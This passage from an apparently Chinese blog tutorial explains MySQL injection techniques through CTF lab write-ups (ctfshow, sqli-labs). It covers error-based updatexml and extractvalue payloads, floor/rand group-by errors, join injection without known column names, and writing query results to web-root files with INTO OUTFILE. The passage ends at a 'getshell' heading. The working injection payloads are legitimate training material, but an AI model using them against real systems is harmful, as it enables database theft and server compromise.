<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">and</span> updatexml<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span>substr<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> flag <span class="token keyword">from</span> ctfshow_flag<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<hr>
<h2 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue"></a>extractvalue</h2><blockquote>
<p>对XML文档进行查询的函数，从目标XML中返回包含所查询值的字符串</p>
</blockquote>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">extractvalue<span class="token punctuation">(</span>目标xml文档，xml路径<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>利用方法和 updatexml 类似，xml 路径部分会抛出完整的参数信息报错</p>
<p><img src="/blog/2023/03/16/mysql%E6%B3%A8%E5%85%A5/image-20250415213403393.png" alt="image-20250415213403393"></p>
<h3 id="ctfshow-web245"><a href="#ctfshow-web245" class="headerlink" title="ctfshow web245"></a>ctfshow web245</h3><p>表名</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">and</span> extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>列名</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='</span>ctfshow_flagsa'<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>字段</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">and</span> extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> flag1 <span class="token keyword">from</span> ctfshow_flagsa<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>截取</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">and</span> extractvalue<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token number">0x7e</span><span class="token punctuation">,</span><span class="token punctuation">(</span>substr<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> flag1 <span class="token keyword">from</span> ctfshow_flagsa<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<hr>
<h2 id="group-by-x2F-floor注入"><a href="#group-by-x2F-floor注入" class="headerlink" title="group by &#x2F; floor注入"></a>group by &#x2F; floor注入</h2><p>参考：</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_27130557/article/details/120902212">https://blog.csdn.net/qq_27130557/article/details/120902212</a></p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/column/235496.html">https://www.freebuf.com/column/235496.html</a></p>
<h3 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h3><ul>
<li><p><code>group by</code></p>
<blockquote>
<p><code>GROUP BY</code> 语句根据一个或多个列对结果集进行分组</p>
</blockquote>
<p>注：MySQL 5.7.5版本后需要用 set 重新设置 sql_mode 以去掉 ONLY_FULL_GROUP_BY 配置，详见：<a target="_blank" rel="noopener" href="https://blog.csdn.net/u012660464/article/details/113977173">https://blog.csdn.net/u012660464/article/details/113977173</a></p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- set sql_mode = 'STRICT_TRANS_TABLES,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION';</span>
<span class="token comment">-- select @@sql_mode;</span>
<span class="token keyword">select</span> name <span class="token keyword">as</span> a<span class="token punctuation">,</span>score <span class="token keyword">as</span> b <span class="token keyword">from</span> test <span class="token keyword">group</span> <span class="token keyword">by</span> a<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>此处 a，b 作为别名， as 可以缺省</p>
<p>test 表：</p>
<p><img src="/blog/2023/03/16/mysql%E6%B3%A8%E5%85%A5/image-20250415225454834.png" alt="image-20250415225454834"></p>
<p><img src="/blog/2023/03/16/mysql%E6%B3%A8%E5%85%A5/image-20250415225223669.png" alt="image-20250415225223669"></p>
<p>通过 group by 进行分组排序，结果会进行分组，a 列中相同 name 会进行合并，如果是 <code>group by b</code> 就是按相同 score 进行合并：</p>
<p><img src="/blog/2023/03/16/mysql%E6%B3%A8%E5%85%A5/image-20250415225656001.png" alt="image-20250415225656001"></p>
<p>合并的记录如果在其他列有不同的地方，按第一次出现的值合并，比如张三的 score 有 100 和 55，由于100 先出现，所以合并后的 b 列为 100</p>
<p>工作流程：<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1941787">https://cloud.tencent.com/developer/article/1941787</a></p>
<p><img src="/blog/2023/03/16/mysql%E6%B3%A8%E5%85%A5/image-20250415234312091.png" alt="image-20250415234312091"></p>
<p>观察这两条查询语句的差别：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> username<span class="token punctuation">,</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">group</span> <span class="token keyword">by</span> username<span class="token punctuation">;</span>
<span class="token keyword">select</span> username<span class="token punctuation">,</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">group</span> <span class="token keyword">by</span> <span class="token string">"username"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="/blog/2023/03/16/mysql%E6%B3%A8%E5%85%A5/image-20250416222619566.png" alt="image-20250416222619566"></p>
<p><img src="/blog/2023/03/16/mysql%E6%B3%A8%E5%85%A5/image-20250416222633052.png" alt="image-20250416222633052"></p>
<ol>
<li><p>第一条查询语句原因是由于 group by 在分组时，会依次取出查询表中的记录并创建一个临时表（表中有两个字段，分别是 key 和<code>count(*)</code>），group by 的对象就是该临时表的<strong>主键</strong>。</p>
<p>如果临时表中已经存在该主键，则<code>count(*)</code>的值+1，<strong>如果表中不存在则将主键插入到临时表中</strong></p>
</li>
<li><p>第二条 group by 的对象是一个字符串 &quot;username&quot;，对于字符串来说，group by 在进行分组时，会直接<strong>将该字符串当做主键</strong>插入到临时表中，如果临时表中存在该主键，则<code>count(*)</code>的值+1。</p>
<p>轮到第二条数据时也是<strong>将该字符串当做主键</strong>插入到临时表，但此时临时表中已经存在该主键，则<code>count(*)</code>的值直接加1<br>也就是说所有行会被分为同一个分组，无论它们的实际值如何</p>
</li>
</ol>
<p>对于第二种情况，很容易出现报错</p>
<p>注意：</p>
<p><code>group by key</code> 在执行时循环读取数据的每一行，将结果保存于临时表中。读取每一行的 key 时，如果 key 存在于临时表中，则更新临时表中的数据（更新数据时，不再计算 rand 值）；如果该 key 不存在于临时表中，则在临时表中插入 key 所在行的数据。（<strong>插入数据时，会再计算 rand 值</strong>）</p>
<br>
</li>
<li><p><code>floor(rand(0)*2)</code></p>
<p><code>rand(0)</code>，即种子设置为0，这样接下来产生的伪随机数都是固定的</p>
<p><img src="/blog/2023/03/16/mysql%E6%B3%A8%E5%85%A5/image-20250415230452871.png" alt="image-20250415230452871"></p>
<p>这里回显的记录数取决于 user 表的记录数</p>
<p>然后<code>rand(0)*2</code>的话，很明显这个值的整数部分不是 0 就是 1</p>
<p>而<code>floor</code>函数可以取整，于是这样子会得到一个固定的 0，1 序列</p>
<p>对于<code>floor(rand(0)*2)</code>，产生的随机数前6位一定是 0 1 1 0 1 1</p>
<p><code>concat(database(),floor(rand(0)*2))</code> 生成 <code>database()+&quot;0&quot;</code> 或 <code>database()+&quot;1&quot;</code> 的数列，而前六位的顺序一定是</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"0"</span>
<span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"1"</span>
<span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"1"</span>
<span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"0"</span>
<span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"1"</span>
<span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"1"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<br>
</li>
<li><p><code>count(*)</code></p>
<blockquote>
<p><code>COUNT(*)</code> 函数返回表中的记录数</p>
</blockquote>
<p><img src="/blog/2023/03/16/mysql%E6%B3%A8%E5%85%A5/image-20250415232004938.png" alt="image-20250415232004938"></p>
<p>这里就是对a中的重复性的数据进行了整合，然后计数，后面的x就是每一类的数量，也就是说张三的数据有6个</p>
</li>
</ul>
<hr>
<h3 id="报错分析"><a href="#报错分析" class="headerlink" title="报错分析"></a>报错分析</h3><blockquote>
<p>原因是<code>group by</code>在向临时表插入数据时，由于<code>rand()</code>多次计算导致<strong>插入临时表时主键重复</strong>，从而报错，又因为报错前<code>concat()</code>中的SQL语句或函数被执行，所以该语句报错且被抛出的主键是SQL语句或函数执行后的结果</p>
</blockquote>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">group</span> <span class="token keyword">by</span> concat<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2023/03/16/mysql%E6%B3%A8%E5%85%A5/image-20250415233210744.png" alt="image-20250415233210744"></p>
<p>报错具体过程：</p>
<ol>
<li><p>group by 建立临时表</p>
</li>
<li><p>取第一条记录，执行<code>concat(database(),floor(rand(0)*2))</code>（第一次执行），结果为<code>database()+&quot;0&quot;</code>，查询临时表，发现<code>database()+&quot;0&quot;</code>这个主键不存在，则准备执行<strong>插入</strong>，此时又会<strong>再执行</strong>一次<code>concat(database(),floor(rand(0)*2))</code>（第二次执行），结果是<code>database()+&quot;1&quot;</code>，然后将该值作为主键插入到临时表。（真正插入到临时表中的<strong>主键</strong>是<code>database()+&quot;1&quot;，concat(database(),floor(rand(0)*2))</code> 执行了两次）</p>
<table>
<thead>
<tr>
<th>操作</th>
<th>key</th>
<th>concat(database(),floor(rand(0)*2))</th>
<th>count(*)</th>
</tr>
</thead>
<tbody><tr>
<td>取第一条记录</td>
<td></td>
<td>database()+”0”</td>
<td></td>
</tr>
<tr>
<td>插入记录</td>
<td>database()+”1”</td>
<td>database()+”1”</td>
<td>1</td>
</tr>
</tbody></table>
</li>
<li><p>取第二条记录，执行<code>concat(database(),floor(rand(0)2))</code>（第三次执行），结果为<code>database()+&quot;1&quot;</code>，查询临时表，发现该主键存在，<code>count(*)</code>的值加1</p>
<table>
<thead>
<tr>
<th>操作</th>
<th>key</th>
<th>concat(database(),floor(rand(0)*2))</th>
<th>count(*)</th>
</tr>
</thead>
<tbody><tr>
<td>取第一条记录</td>
<td></td>
<td>database()+”0”</td>
<td></td>
</tr>
<tr>
<td>插入记录</td>
<td>database()+”1”</td>
<td>database()+”1”</td>
<td>1</td>
</tr>
<tr>
<td>取第二条记录，不用插入</td>
<td>database()+”1”</td>
<td>database()+”1”</td>
<td>2</td>
</tr>
</tbody></table>
</li>
<li><p>取第三条记录，执行<code>concat(database(),floor(rand(0)*2))</code>（第四次执行），结果为<code>database()+&quot;0&quot;</code>，查询临时表发现该主键不存在，则准备执行插入动作，此时又会在执行一次<code>concat(database(),floor(rand(0)*2))</code>（第五次执行），结果是<code>database()+&quot;1&quot;</code>，然后<strong>将该值作为主键插入到临时表</strong>。但由于临时表已经存在<code>database()+&quot;1&quot;</code>这个主键，就会爆出主键重复，同时也带出了数据库名</p>
<p>可以看出来，出现报错的原因是因为要插入主键的数据产生变化导致的</p>
<table>
<thead>
<tr>
<th>操作</th>
<th>key</th>
<th>concat(database(),floor(rand(0)*2))</th>
<th>count(*)</th>
</tr>
</thead>
<tbody><tr>
<td>取第一条记录</td>
<td></td>
<td>database()+”0”</td>
<td></td>
</tr>
<tr>
<td>插入记录</td>
<td>database()+”1”</td>
<td>database()+”1”</td>
<td>1</td>
</tr>
<tr>
<td>取第二条记录，不用插入</td>
<td>database()+”1”</td>
<td>database()+”1”</td>
<td>2</td>
</tr>
<tr>
<td>取第三条记录</td>
<td></td>
<td>database()+”0”</td>
<td></td>
</tr>
<tr>
<td>不存在，插入记录</td>
<td>database()+”1”（已存在，主键必须唯一）</td>
<td>database()+”1”</td>
<td></td>
</tr>
</tbody></table>
</li>
</ol>
<p>注：由以上过程可以发现，总共取了三条记录，所以表中的数据至少要为三条才可以注入成功</p>
<p>payload：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token number">1</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>x <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">group</span> <span class="token keyword">by</span> x<span class="token punctuation">)</span>a<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>注：<code>floor</code>（向下取整）某些情况下也可以替换成<code>ceil</code>（向上取整）</p>
<hr>
<h3 id="ctfshow-web246"><a href="#ctfshow-web246" class="headerlink" title="ctfshow web246"></a>ctfshow web246</h3><p>表名</p>
<p>注：这里不能用<code>group_concat</code>来合并查询结果而只能用<code>limit</code>，因为查询出来的内容不止一行</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> table_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">limit</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">,</span>floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>a <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">group</span> <span class="token keyword">by</span> a<span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>列名</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' union select 1,count(*),concat((select column_name from information_schema.columns where table_name='</span>ctfshow_flags' <span class="token keyword">limit</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">,</span>floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>a <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">group</span> <span class="token keyword">by</span> a<span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>字段</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">,</span>concat<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> flag2 <span class="token keyword">from</span> ctfshow_flags<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0x7e</span><span class="token punctuation">,</span>floor<span class="token punctuation">(</span>rand<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>a <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">group</span> <span class="token keyword">by</span> a<span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<hr>
<h2 id="join-无列名注入"><a href="#join-无列名注入" class="headerlink" title="join 无列名注入"></a>join 无列名注入</h2><p>参考文章：<a target="_blank" rel="noopener" href="https://web.archive.org/web/20230923132952/http://www.wupco.cn/?p=4117">https://web.archive.org/web/20230923132952/http://www.wupco.cn/?p=4117</a></p>
<p>可以在过滤了 information_schema、columns、tables、database、schema 等关键字或函数的时候利用</p>
<h3 id="字段名"><a href="#字段名" class="headerlink" title="字段名"></a>字段名</h3><p>常用的是 union 做法，但是如果 union 也被 ban 了呢，这个时候可以考虑用 <code>join</code> 函数</p>
<blockquote>
<p>在使用别名的时候，表中不能出现相同的字段名，于是我们就利用join把表扩充成两份，在最后别名c的时候查询到重复字段，就成功报错</p>
</blockquote>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> username <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">as</span> a <span class="token keyword">join</span> <span class="token keyword">user</span> <span class="token keyword">as</span> b<span class="token punctuation">)</span> <span class="token keyword">as</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2023/03/16/mysql%E6%B3%A8%E5%85%A5/image-20250416002522008.png" alt="image-20250416002522008"></p>
<p>可以把当前表第一个字段成功爆出，这里是 id</p>
<p>同时利用 <code>using</code> 函数可以爆其他字段</p>
<blockquote>
<p>在 join 连接中，仅针对同名字段，使用后会自动合并对应字段为一个，可同时使用多个字段作为条件</p>
</blockquote>
<p>即这里使用<code>using(id)</code>后 id 就不会出现重复了，也就不会报错</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> username <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">as</span> a <span class="token keyword">join</span> <span class="token keyword">user</span> <span class="token keyword">as</span> b <span class="token keyword">using</span><span class="token punctuation">(</span>id<span class="token punctuation">,</span>username<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">as</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2023/03/16/mysql%E6%B3%A8%E5%85%A5/image-20250416002702805.png" alt="image-20250416002702805"></p>
<hr>
<h3 id="表名"><a href="#表名" class="headerlink" title="表名"></a>表名</h3><p><code>Polygon</code>函数</p>
<blockquote>
<p><code>Polygon</code>从多个<code>LineString</code>或WKB <code>LineString</code>参数 构造一个值 。如果任何参数不表示<code>LinearRing</code>（也就是说，不是一个封闭和简单的<code>LineString</code>），返回值就是<code>NULL</code></p>
</blockquote>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token keyword">polygon</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>如果传参不是 linestring 的话，就会爆错，而当如果我们传入的是存在的字段的话，就会爆出已知库、表、列</p>
<p>疑似有版本限制</p>
<hr>
<h3 id="库名"><a href="#库名" class="headerlink" title="库名"></a>库名</h3><blockquote>
<p>一个库中存在不同的系统或自定义函数，如果函数不存在，他就会爆出这个库没有此函数</p>
</blockquote>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">where</span> id <span class="token operator">=</span><span class="token number">1</span><span class="token operator">-</span>a<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2023/03/16/mysql%E6%B3%A8%E5%85%A5/image-20250416003215661.png" alt="image-20250416003215661"></p>
<hr>
<h1 id="MySQL-文件操作"><a href="#MySQL-文件操作" class="headerlink" title="MySQL 文件操作"></a>MySQL 文件操作</h1><h2 id="导出数据到文件"><a href="#导出数据到文件" class="headerlink" title="导出数据到文件"></a>导出数据到文件</h2><blockquote>
<p><code>SELECT...INTO OUTFILE</code> 允许你将查询的结果写入一个文本文件</p>
</blockquote>
<p>查看相关配置</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">show</span> <span class="token keyword">global</span> variables <span class="token operator">like</span> <span class="token string">'%secure%'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2023/03/16/mysql%E6%B3%A8%E5%85%A5/image-20250416113935503.png" alt="image-20250416113935503"></p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> @<span class="token variable">@secure_file_priv</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2023/03/16/mysql%E6%B3%A8%E5%85%A5/image-20250416114026850.png" alt="image-20250416114026850"></p>
<ul>
<li>当 secure_file_priv 的值为 <code>null</code> ，表示限制 mysql 不允许导入 | 导出</li>
<li>当 secure_file_priv 的值为 <code>/tmp/</code> ，表示限制 mysql 的导入 | 导出只能发生在 &#x2F;tmp&#x2F; 目录下</li>
<li>当 secure_file_priv 的值为 <code>空</code> 时，表示不对 mysql 的导入 | 导出做限制</li>
</ul>
<h3 id="查询结果写文件带外"><a href="#查询结果写文件带外" class="headerlink" title="查询结果写文件带外"></a>查询结果写文件带外</h3><p>实用性不强，都能写文件了，在 PHP&#x2F;JSP 下就能随便写 shell 了，不过在 python，nodejs 这种环境下还是有说法的</p>
<h4 id="sqli-labs-less-7"><a href="#sqli-labs-less-7" class="headerlink" title="sqli-labs less-7"></a>sqli-labs less-7</h4><p>ctfshow web523</p>
<p>本题中，参数 id 传入任何数字返回固定的字符串<code>  You are in.... Use outfile......</code>，如果构造闭合产生报错也只回显<code> You have an error in your SQL syntax</code></p>
<p>这里既然让我们 use outfile，那么就尝试写文件把查询结果带外</p>
<p>首先，经过测试，在传入<code>1&#39;))--+</code>时不会产生报错的回显，可知闭合方式为<code>1&#39;))</code><del>（不过要测出来这种闭合还是要花点时间的，这里是直接看了下sqli-labs的源码才知道的）</del></p>
<p>查数据库，有必要的话可以先用盲注语句测试是否有配置 secure_file_priv</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span><span class="token string">')) union select 1,if(substr(@@secure_file_priv,1,13)!='</span><span class="token operator">/</span>var<span class="token operator">/</span>www<span class="token operator">/</span>html<span class="token string">',0,sleep(5)),3--+

-1'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>SCHEMA_NAME<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span>SCHEMATA <span class="token keyword">into</span> <span class="token keyword">outfile</span> <span class="token string">'/var/www/html/1.txt'</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>后者执行后会回显报错语句，但是不影响写入</p>
<p><img src="/blog/2023/03/16/mysql%E6%B3%A8%E5%85%A5/image-20250416170349897.png" alt="image-20250416170349897"></p>
<p>查表名</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span><span class="token string">')) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='</span>ctfshow<span class="token string">' into outfile '</span><span class="token operator">/</span>var<span class="token operator">/</span>www<span class="token operator">/</span>html<span class="token operator">/</span><span class="token number">2.</span>txt'<span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>访问 2.txt 得到表 flagdk</p>
<p>查列名</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span><span class="token string">')) union select 1,group_concat(column_name),3 from information_schema.columns where table_schema='</span>ctfshow<span class="token string">' and table_name="flagdk" into outfile '</span><span class="token operator">/</span>var<span class="token operator">/</span>www<span class="token operator">/</span>html<span class="token operator">/</span><span class="token number">3.</span>txt'<span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>访问 3.txt 得到列 id,flag43</p>
<p>查字段</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span><span class="token string">')) union select 1,group_concat(id,'</span><span class="token comment">--',flag43),3 from ctfshow.flagdk into outfile '/var/www/html/4.txt'--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>访问 4.txt 得到 flag</p>
<hr>
<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>payload：</p>
